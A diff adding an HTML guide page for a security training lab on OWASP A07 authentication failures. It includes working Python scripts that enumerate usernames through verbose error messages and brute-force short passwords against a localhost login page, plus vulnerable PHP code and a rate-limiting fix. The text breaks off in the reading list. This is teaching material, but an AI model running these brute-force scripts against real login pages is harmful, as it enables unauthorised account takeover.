@@ -1,0 +1,427 @@
+<html>
+    <head>
+        <title>A07 - Guide</title>
+        <link rel="icon" href="../resources/image/favicon.ico">
+        <!-- bootstrap css and js -->
+        <link rel="stylesheet" href="../resources/css/bootstrap.min.css">
+        <link rel="stylesheet" href="../resources/css/bootstrap.min.css.map">
+        <script src="../resources/js/jquery-3.6.0.min.js"></script>
+        <script src="../resources/js/bootstrap.min.js"></script>
+        <style>
+            .custom-scenario.accordion-button {
+                color: #141619;
+                background-color: #d3d3d4;
+                box-shadow: inset 0 calc(var(--bs-accordion-border-width) * -1) 0 var(--bs-accordion-border-color);
+            }
+
+            .custom-attack.accordion-button {
+                color: #842029;
+                background-color: #f8d7da;
+                box-shadow: inset 0 calc(var(--bs-accordion-border-width) * -1) 0 var(--bs-accordion-border-color);
+            }
+
+            .custom-defense.accordion-button {
+                color: #0f5132;
+                background-color: #d1e7dd;
+                box-shadow: inset 0 calc(var(--bs-accordion-border-width) * -1) 0 var(--bs-accordion-border-color);
+            }
+
+            .custom-explanation.accordion-button {
+                color: #084298;
+                background-color: #cfe2ff;
+                box-shadow: inset 0 calc(var(--bs-accordion-border-width) * -1) 0 var(--bs-accordion-border-color);
+            }
+
+            .custom-challenge.accordion-button {
+                color: #055160;
+                background-color: #cff4fc;
+                box-shadow: inset 0 calc(var(--bs-accordion-border-width) * -1) 0 var(--bs-accordion-border-color);
+            }
+
+            .accordion-button:hover {
+                opacity: 75%;
+            }
+        </style>
+    </head>
+    <body class="text-center">
+        <main class="w-100 m-auto">
+            <h1 class="h1 mb-3 mt-3 fw-normal m-auto">A07: Identification and Authentication Failures</h1>
+            <h5 class="h5 mb-5 fw-normal">Please read the following scenario</h5>
+            <div class="accordion mx-5" id="accordionExample">
+                <div class="accordion-item">
+                    <h2 class="accordion-header" id="headingOne">
+                        <button class="accordion-button custom-scenario" type="button" data-bs-toggle="collapse" data-bs-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne">
+                            Scenario
+                        </button>
+                    </h2>
+                    <div id="collapseOne" class="accordion-collapse collapse show" aria-labelledby="headingOne">
+                        <div class="accordion-body text-start m-3">
+                            As a student taking cyber security modules, you notice that the student portal login page is problematic and probably vulnerable to some attacks. 
+                            You are gathering evidences and trying to conduct some proof of concept in order to report your findings to the IT department. 
+                            Please find out the vulnerabilities and convince the IT department to fix the page immediately.
+                            <br><br>
+                            Click here to enter the <a href="./login.php" target="_blank">Login Page</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <h2 class="accordion-header" id="headingTwo">
+                        <button class="accordion-button custom-attack collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
+                            Attack
+                        </button>
+                    </h2>
+                    <div id="collapseTwo" class="accordion-collapse collapse" aria-labelledby="headingTwo">
+                        <div class="accordion-body text-start m-3">
+                            Before you start exploiting the login page, please read what is authentication failures.
+                            <figure class="text-center m-3">
+                                <blockquote class="blockquote">
+                                    <p><u>There may be authentication weaknesses if the application: Permits automated attacks such as credential stuffing, where the attacker has a list of valid usernames and passwords OR Permits brute force or other automated attacks ...</u></p>
+                                </blockquote>
+                                <figcaption class="blockquote-footer">
+                                    Description in <cite title="Source Title">OWASP Top 10:2021</cite>
+                                </figcaption>
+                            </figure>
+                            There is one vulnerability exist in the pages, it is related to authentication failures.
+                            You can explore the pages by yourself and search for any traces of the weaknesses.
+                            <p>
+                                <button class="btn btn-primary my-3 me-3" type="button" data-bs-toggle="collapse" data-bs-target="#multiCollapseExample1" aria-expanded="false" aria-controls="multiCollapseExample1">Show hint #1</button>
+                                <button class="btn btn-primary my-3 mx-3" type="button" data-bs-toggle="collapse" data-bs-target="#multiCollapseExample2" aria-expanded="false" aria-controls="multiCollapseExample2">Show hint #2</button>
+                                <button class="btn btn-primary my-3 ms-3" type="button" data-bs-toggle="collapse" data-bs-target="#multiCollapseExample3" aria-expanded="false" aria-controls="multiCollapseExample3">Show full exploitations</button>
+                            </p>
+                            <div class="row">
+                                <div class="col">
+                                    <div class="collapse multi-collapse" id="multiCollapseExample1">
+                                        <div class="card card-body">
+                                            <h5>Hint #1</h5>
+                                            <p>
+                                                If you do not have any programming experience, you will find this vulnerability very hard to exploit.
+                                                <br>
+                                                (You will need to do some programming or scripting to exploit the page)
+                                            </p>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col">
+                                        <div class="collapse multi-collapse" id="multiCollapseExample2">
+                                        <div class="card card-body">
+                                            <h5>Hint #2</h5>
+                                            <p>
+                                                Finding all the limitations on user inputs and the behaviors will be helpful in this exploitation. 
+                                                <br>
+                                                (You can use them as stopping conditions and parameters for your code)
+                                            </p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="row mt-3">
+                                <div class="col">
+                                    <div class="collapse multi-collapse" id="multiCollapseExample3">
+                                        <div class="card card-body">
+                                            <h5>Vulnerability</h5>
+                                            <p>
+                                                This vulnerability is related to brute force attack, which can be exploited by running a program or a script. 
+                                                As we can see that the length of both the username and password are relatively short, that means attackers can exhaustively search for the username without too many resources. 
+                                                Besides, the feedback message from the server is too informative. 
+                                                A generally safe message should not contain any clues or information about the username or the password, this only helps the attackers to optimize their brute force attacks.
+                                            </p>
+                                            <h6>Exploitation</h6>
+                                            <ol>
+                                                <li>In order to brute force the username and password, we need to write a program to automate the process.</li>
+                                                <li>Before coding the script, we should first identify the behaviors and constrains of the page.</li>
+                                                <li>We can start with typing random username and password to observe the constrains of both inputs.</li>
+                                                <li>Then we can notice that the username is formed by less than 3 characters and digits and password is formed by less than 5 digits.</li>
+                                                <li>Also the message will change according to different login status, like if user doesn't exist in the database, the message will be "User doesn't exist".</li>
+                                                <li>Now we have all the information we need to do some programming!</li>
+                                            </ol>
+                                            <h6>username.py</h6>
+                                            <p>
+                                                <table class="table table-striped table-hover table-sm table-bordered mt-2" style="width: auto;">
+                                                    <tbody>
+                                                        <tr><td><code style="color: #000000;">1 </code></td><td style="white-space: break-spaces;"><code>import subprocess</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">2 </code></td><td style="white-space: break-spaces;"><code> </code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">3 </code></td><td style="white-space: break-spaces;"><code>characters = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">4 </code></td><td style="white-space: break-spaces;"><code>length = 2 # maximum length of the output</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">5 </code></td><td style="white-space: break-spaces;"><code>url = "http://localhost/A07-authenticationFailure/login.php"</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">6 </code></td><td style="white-space: break-spaces;"><code> </code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">7 </code></td><td style="white-space: break-spaces;"><code>for i in range(0, length):</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">8 </code></td><td style="white-space: break-spaces;"><code>  loop = i+1</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">9 </code></td><td style="white-space: break-spaces;"><code>  f = open(f"loop{str(loop)}_user.py", "w")</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">10</code></td><td style="white-space: break-spaces;"><code>  f.writelines('import requests\n')</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">11</code></td><td style="white-space: break-spaces;"><code>  f.writelines('characters = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]\n')</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">12</code></td><td style="white-space: break-spaces;"><code>  indent = ""</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">13</code></td><td style="white-space: break-spaces;"><code>  output = ""</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">14</code></td><td style="white-space: break-spaces;"><code>  for j in range(0, loop):</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">15</code></td><td style="white-space: break-spaces;"><code>    f.writelines(f"{indent}for {characters[j]} in characters:\n")</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">16</code></td><td style="white-space: break-spaces;"><code>    indent += "  "</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">17</code></td><td style="white-space: break-spaces;"><code>    output += characters[j] + "+"</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">18</code></td><td style="white-space: break-spaces;"><code>  f.writelines(f"{indent}temp = requests.post('{url}', data={{'username': {output[:-1]}, 'password': '123'}})\n")</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">19</code></td><td style="white-space: break-spaces;"><code>  f.writelines(f"{indent}if \"User doesn't exist\" not in temp.text:\n")</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">20</code></td><td style="white-space: break-spaces;"><code>  f.writelines(f"{indent}  print('Possible username: '+{output[:-1]})\n")</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">21</code></td><td style="white-space: break-spaces;"><code>  f.close()</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">22</code></td><td style="white-space: break-spaces;"><code> </code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">23</code></td><td style="white-space: break-spaces;"><code>for i in range(1, length+1):</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">24</code></td><td style="white-space: break-spaces;"><code>  print(subprocess.check_output(f"python3 loop{str(i)}_user.py", shell=True).decode())</code><br></td></tr>
+                                                    </tbody>
+                                                </table>
+                                                This file is responsible for finding possible usernames. 
+                                                From the login page we know that when the username doesn't exist in the database, it will display a message of "User doesn't exist". 
+                                                Thus we can use this finding to discover the possible usernames, when the page displays a message other than "User doesn't exist". 
+                                                The main logic flow of the script starts by generating multiple Python scripts which can brute force in certain length of usernames (line 9 - 21), then execute them accordingly and record the output (line 23 - 24). 
+                                                For each of these Python scripts, it will loop through all possible combinations and send the crafted request to the target login page (line 15 - 18).
+                                                When the phrase "User doesn't exist" is NOT in the response text, we can conclude that this variable is likely to be an username (line 19 - 20).
+                                            </p>
+                                            <h6>password.py</h6>
+                                            <p>
+                                                <table class="table table-striped table-hover table-sm table-bordered mt-2" style="width: auto;">
+                                                    <tbody>
+                                                        <tr><td><code style="color: #000000;">1 </code></td><td style="white-space: break-spaces;"><code>import subprocess</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">2 </code></td><td style="white-space: break-spaces;"><code> </code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">3 </code></td><td style="white-space: break-spaces;"><code>characters = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">4 </code></td><td style="white-space: break-spaces;"><code>length = 4</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">5 </code></td><td style="white-space: break-spaces;"><code>url = "http://localhost/A07-authenticationFailure/login.php"</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">6 </code></td><td style="white-space: break-spaces;"><code>usernames = ["bw", "px", "v4", "5d"]</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">7 </code></td><td style="white-space: break-spaces;"><code> </code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">8 </code></td><td style="white-space: break-spaces;"><code>for username in usernames:</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">9 </code></td><td style="white-space: break-spaces;"><code>  print(f"Cracking user {username}:")</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">10</code></td><td style="white-space: break-spaces;"><code>  for i in range(0, length):</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">11</code></td><td style="white-space: break-spaces;"><code>    loop = i+1</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">12</code></td><td style="white-space: break-spaces;"><code>    f = open(f"loop{str(loop)}_pass.py", "w")</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">13</code></td><td style="white-space: break-spaces;"><code>    f.writelines('import requests\n')</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">14</code></td><td style="white-space: break-spaces;"><code>    f.writelines('characters = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]\n')</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">15</code></td><td style="white-space: break-spaces;"><code>    indent = ""</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">16</code></td><td style="white-space: break-spaces;"><code>    output = ""</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">17</code></td><td style="white-space: break-spaces;"><code>    for j in range(0, loop):</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">18</code></td><td style="white-space: break-spaces;"><code>      f.writelines(f"{indent}for {characters[j]} in characters:\n")</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">19</code></td><td style="white-space: break-spaces;"><code>      indent += "  "</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">20</code></td><td style="white-space: break-spaces;"><code>      output += characters[j] + "+"</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">21</code></td><td style="white-space: break-spaces;"><code>    f.writelines(f"{indent}temp = requests.post('{url}', data={{'username': '{username}', 'password': {output[:-1]}}})\n")</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">22</code></td><td style="white-space: break-spaces;"><code>    f.writelines(f"{indent}if \"Incorrect password\" not in temp.text:\n")</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">23</code></td><td style="white-space: break-spaces;"><code>    f.writelines(f"{indent}  print('Possible password: '+{output[:-1]})\n")</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">24</code></td><td style="white-space: break-spaces;"><code>    f.writelines(f"{indent}  exit()")</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">25</code></td><td style="white-space: break-spaces;"><code>    f.close()</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">26</code></td><td style="white-space: break-spaces;"><code> </code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">27</code></td><td style="white-space: break-spaces;"><code>  for i in range(1, length+1):</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">28</code></td><td style="white-space: break-spaces;"><code>    print(subprocess.check_output(f"python3 loop{str(i)}_pass.py", shell=True).decode())</code><br></td></tr>
+                                                    </tbody>
+                                                </table>
+                                                This file is responsible for finding possible password. 
+                                                The main logic flow is the same as <code>username.py</code>, generating multiple Python scripts, then execute them accordingly and record the output. 
+                                                After discovering possible usernames, we can find that the page display a different message when entering a valid username with incorrect password, which is "Incorrect password". 
+                                                This phrase is used to be the stopping condition of the script (line 22) and a list of found usernames is added to the payload sent to the login page (line 6). 
+                                                The rest of the script is mostly same as the <code>username.py</code>.
+                                            </p>
+                                            <h6>Explanation</h6>
+                                            <p>
+                                                This vulnerability occurs when the page do not enforce any retry limits on the login process. 
+                                                Brute force attack is one of the most common ways to attack a system because it can guarantee a solution given sufficient amount of time and resources. 
+                                                The login page here has implemented a very weak username and password as the length and combinations are very easy to crack for simplicity. 
+                                                But in real life scenarios, most of the credentials have strict rules on their combinations, such as minimum 8 characters, includes at least one uppercase and lowercase letter etc. 
+                                                Although this can increase the difficulties of brute force attack, brute force attack is still possible without a suitable defense mechanism.
+
+                                            </p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <h2 class="accordion-header" id="headingThree">
+                        <button class="accordion-button custom-defense collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree">
+                            Defense
+                        </button>
+                    </h2>
+                    <div id="collapseThree" class="accordion-collapse collapse" aria-labelledby="headingThree">
+                        <div class="accordion-body text-start m-3">
+                            <p>
+                                There are a lot of methods to defense against the above vulnerability. 
+                                The methods describe in this section may not be the best method, but are able to stop similar attacks. 
+                                You are welcome to change the files and test your own defense mechanisms.
+                            </p>
+                            <h5>Code Explanation</h5>
+                            <p>
+                                Before you implement the countermeasures, you have to know what the code is doing and which part of the code you should change.
+                                Below are the code snippets of the relevant logic, please fully understand the code before you proceed.
+                            </p>
+                            <h6>login.php</h6>
+                            <p>
+                                This is the file responsible for checking the login credentials. 
+                                The logic flow here is a very standard way for checking the login details with the backend database. 
+                                However the responses from the server expose too many details on the username and password. 
+                                A more suitable message would be indicating login failed without giving specific reasons. 
+                                <br><br>
+                                Checking login status (line 22-50):
+                                <table class="table table-striped table-hover table-sm table-bordered mt-2" style="width: auto;">
+                                    <tbody>
+                                        <tr><td><code style="color: #000000;">22</code></td><td style="white-space: break-spaces;"><code>if (strlen($_POST["username"]) > 2) {</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">23</code></td><td style="white-space: break-spaces;"><code>    $message = "The username should not exceed 2 characters and digits";</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">24</code></td><td style="white-space: break-spaces;"><code>} else if (strlen($_POST["password"]) > 4) {</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">25</code></td><td style="white-space: break-spaces;"><code>    $message = "The password should not exceed 4 digits";</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">26</code></td><td style="white-space: break-spaces;"><code>} else {</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">27</code></td><td style="white-space: break-spaces;"><code> </code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">28</code></td><td style="white-space: break-spaces;"><code>    // check if the user exist in the database</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">29</code></td><td style="white-space: break-spaces;"><code>    $sql = $conn->prepare("SELECT * from users WHERE username=?;");</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">30</code></td><td style="white-space: break-spaces;"><code>    $sql->bind_param("s", $_POST["username"]);</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">31</code></td><td style="white-space: break-spaces;"><code>    $sql->execute();</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">32</code></td><td style="white-space: break-spaces;"><code>    $result = $sql->get_result();</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">33</code></td><td style="white-space: break-spaces;"><code> </code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">34</code></td><td style="white-space: break-spaces;"><code>    if ($result->num_rows == 0) {</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">35</code></td><td style="white-space: break-spaces;"><code>        $message = "User doesn't exist";</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">36</code></td><td style="white-space: break-spaces;"><code>    } else {</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">37</code></td><td style="white-space: break-spaces;"><code>        // select the login info from database</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">38</code></td><td style="white-space: break-spaces;"><code>        $sql = $conn->prepare("SELECT * from users WHERE username=? AND password=?;");</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">39</code></td><td style="white-space: break-spaces;"><code>        $sql->bind_param("ss", $_POST["username"], $_POST["password"]);</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">40</code></td><td style="white-space: break-spaces;"><code>        $sql->execute();</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">41</code></td><td style="white-space: break-spaces;"><code>        $result = $sql->get_result();</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">42</code></td><td style="white-space: break-spaces;"><code>    </code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">43</code></td><td style="white-space: break-spaces;"><code>        if ($result->num_rows == 1) {</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">44</code></td><td style="white-space: break-spaces;"><code>            $message = "Login succeed";</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">45</code></td><td style="white-space: break-spaces;"><code>        } else {</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">46</code></td><td style="white-space: break-spaces;"><code>            $message = "Incorrect password";</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">47</code></td><td style="white-space: break-spaces;"><code>        }</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">48</code></td><td style="white-space: break-spaces;"><code>    }</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">49</code></td><td style="white-space: break-spaces;"><code>    $sql->close();</code><br></td></tr>
+                                        <tr><td><code style="color: #000000;">50</code></td><td style="white-space: break-spaces;"><code>}</code><br></td></tr>
+                                    </tbody>
+                                </table>
+                                This code snippet is the part deciding what message to be displayed on the login page. 
+                                It first checks for the length of the username and the password. 
+                                If the length of either of them exceed the corresponding limits, it will tell the users that there are limitations on the inputs. 
+                                Then the script will check against the database to make sure the username exists in the records, otherwise it will notify the users for invalid username. 
+                                With the details message from the server, an attacker can easily craft the script to brute force the login with less effort.
+                            </p>
+                            <br>
+                            <h5>Defense Explanation</h5>
+                            <p>
+                                After knowing what the code is doing and how does the vulnerabilities occur, we can start to know more about how to fix them. 
+                                Please try to change the code base on your understanding at least once before directly looking into the solutions. 
+                                You should retry the above exploitations after you have fixed the code to find out whether you have done it correctly or not.
+                            </p>
+                            <h6>Vulnerability</h6>
+                            <p>
+                                This vulnerability is related to brute force attack. 
+                                One of the defensive mechanisms can be removing all the messages and only notify the users whether their login attempts are successful or not. 
+                                However this cannot prevent brute force attack as the attackers can always try with more resources and numerous combinations to figure out the username and password. 
+                                A more complete solution would be setting a retry limit within a short period of time because we know that normal users will not enter so many incorrect credentials in a short amount of time.
+                            </p>
+                            <button class="btn btn-primary mb-3" type="button" data-bs-toggle="collapse" data-bs-target="#multiCollapseExample5" aria-expanded="false" aria-controls="multiCollapseExample5">Show solution</button>
+                            <div class="row">
+                                <div class="col">
+                                    <div class="collapse multi-collapse" id="multiCollapseExample5">
+                                        <div class="card card-body">
+                                            <h5>Solution</h5>
+                                            <p>
+                                                login.php (line 22-66):
+                                                <table class="table table-striped table-hover table-sm table-bordered mt-2" style="width: auto;">
+                                                    <tbody>
+                                                        <tr><td><code style="color: #000000;">22</code></td><td style="white-space: break-spaces;"><code>$lastFailedLogin = fopen("lastFailedLogin.txt", "r") or die("Unable to open file!");</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">23</code></td><td style="white-space: break-spaces;"><code>$info = explode(";", fgets($lastFailedLogin));</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">24</code></td><td style="white-space: break-spaces;"><code>$lastTime = $info[0];</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">25</code></td><td style="white-space: break-spaces;"><code>$attempt = intval($info[1]);</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">26</code></td><td style="white-space: break-spaces;"><code>fclose($lastFailedLogin);</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">27</code></td><td style="white-space: break-spaces;"><code> </code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">28</code></td><td style="white-space: break-spaces;"><code>if (date('Y-m-d H:i:s', strtotime($lastTime . ' +5 minute')) > date("Y-m-d H:i:s") && $attempt > 3) {</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">29</code></td><td style="white-space: break-spaces;"><code>    $message = "Exceed retry attempts, try again later";</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">30</code></td><td style="white-space: break-spaces;"><code>} else if (strlen($_POST["username"]) > 2) {</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">31</code></td><td style="white-space: break-spaces;"><code>    $message = "The username should not exceed 2 characters and digits";</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">32</code></td><td style="white-space: break-spaces;"><code>} else if (strlen($_POST["password"]) > 4) {</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">33</code></td><td style="white-space: break-spaces;"><code>    $message = "The password should not exceed 4 digits";</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">34</code></td><td style="white-space: break-spaces;"><code>} else {</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">35</code></td><td style="white-space: break-spaces;"><code> </code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">36</code></td><td style="white-space: break-spaces;"><code>    // check if the user exist in the database</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">37</code></td><td style="white-space: break-spaces;"><code>    $sql = $conn->prepare("SELECT * from users WHERE username=?;");</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">38</code></td><td style="white-space: break-spaces;"><code>    $sql->bind_param("s", $_POST["username"]);</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">39</code></td><td style="white-space: break-spaces;"><code>    $sql->execute();</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">40</code></td><td style="white-space: break-spaces;"><code>    $result = $sql->get_result();</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">41</code></td><td style="white-space: break-spaces;"><code> </code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">42</code></td><td style="white-space: break-spaces;"><code>    if ($result->num_rows == 0) {</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">43</code></td><td style="white-space: break-spaces;"><code>        $message = "User doesn't exist";</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">44</code></td><td style="white-space: break-spaces;"><code>    } else {</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">45</code></td><td style="white-space: break-spaces;"><code>        // select the login info from database</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">46</code></td><td style="white-space: break-spaces;"><code>        $sql = $conn->prepare("SELECT * from users WHERE username=? AND password=?;");</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">47</code></td><td style="white-space: break-spaces;"><code>        $sql->bind_param("ss", $_POST["username"], $_POST["password"]);</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">48</code></td><td style="white-space: break-spaces;"><code>        $sql->execute();</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">49</code></td><td style="white-space: break-spaces;"><code>        $result = $sql->get_result();</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">50</code></td><td style="white-space: break-spaces;"><code>    </code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">51</code></td><td style="white-space: break-spaces;"><code>        if ($result->num_rows == 1) {</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">52</code></td><td style="white-space: break-spaces;"><code>            $message = "Login succeed";</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">53</code></td><td style="white-space: break-spaces;"><code>        } else {</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">54</code></td><td style="white-space: break-spaces;"><code>            $message = "Incorrect password";</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">55</code></td><td style="white-space: break-spaces;"><code>        }</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">56</code></td><td style="white-space: break-spaces;"><code>    }</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">57</code></td><td style="white-space: break-spaces;"><code>    $sql->close();</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">58</code></td><td style="white-space: break-spaces;"><code>}</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">59</code></td><td style="white-space: break-spaces;"><code> </code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">60</code></td><td style="white-space: break-spaces;"><code>$lastFailedLogin = fopen("lastFailedLogin.txt", "w") or die("Unable to open file!");</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">61</code></td><td style="white-space: break-spaces;"><code>if ($message == "Login succeed")  {</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">62</code></td><td style="white-space: break-spaces;"><code>    fwrite($lastFailedLogin, date("Y-m-d H:i:s").";0");</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">63</code></td><td style="white-space: break-spaces;"><code>} else {</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">64</code></td><td style="white-space: break-spaces;"><code>    fwrite($lastFailedLogin, date("Y-m-d H:i:s").";".((string) $attempt+1));</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">65</code></td><td style="white-space: break-spaces;"><code>}</code><br></td></tr>
+                                                        <tr><td><code style="color: #000000;">66</code></td><td style="white-space: break-spaces;"><code>fclose($lastFailedLogin);</code><br></td></tr>
+                                                    </tbody>
+                                                </table>
+                                                Apart from modifying the code, a new file <code>lastFailedLogin.txt</code> is added to the directory to record the last attempt timestamp and number of attempts. 
+                                                The newly added code is responsible for reading the file and reject the request if the users have exceed the retry limits (line 22 - 29). 
+                                                The other new part is to update the file when a failed attempt occurs or reset the file when a successful login happens (line 60 - 66). 
+                                                However this mechanism is very primitive because 1) the records are publicly available and 2) legitimate users has a high chance of unable to use the page when an attacker keep spamming the website (DoS).
+                                            </p>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <h2 class="accordion-header" id="headingFour">
+                        <button class="accordion-button custom-explanation collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseFour" aria-expanded="false" aria-controls="collapseFour">
+                            Resources & Further Readings
+                        </button>
+                    </h2>
+                    <div id="collapseFour" class="accordion-collapse collapse" aria-labelledby="headingFour">
+                        <div class="accordion-body text-start m-3">
+                            <p>
+                                If you are interested in this topic and eager to learn more, here are some good references for you:
+                            </p>
+                            <ul>
+                                <li><a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" target="_blank">A07 Identification and Authentication Failures - OWASP Top 10:2021</a></li>
